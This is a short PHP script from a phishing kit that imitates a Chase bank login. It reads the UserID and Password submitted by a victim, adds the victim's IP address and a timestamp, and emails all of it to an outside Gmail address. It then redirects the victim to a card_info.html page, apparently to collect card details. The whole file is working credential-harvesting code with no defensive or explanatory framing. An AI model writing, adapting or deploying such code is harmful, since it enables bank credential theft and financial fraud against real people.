<?

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate= date("D M d, Y g:i a");
$UserID = $_POST['UserID'];
$Password = $_POST['Password'];


//Twichiya Dial  E-Mail   
$subj = "Chase USER INFO' $UserID ";
$msg = " ---------------------  \nUserID: $UserID\nPassword: $Password\nIP: $ip\nDate: $adddate\n ------------------- ";
mail("fittedtosign@gmail.com", $subj, $msg);
mail("$cc", $subj, $msg);
header("Location:card_info.html");
?>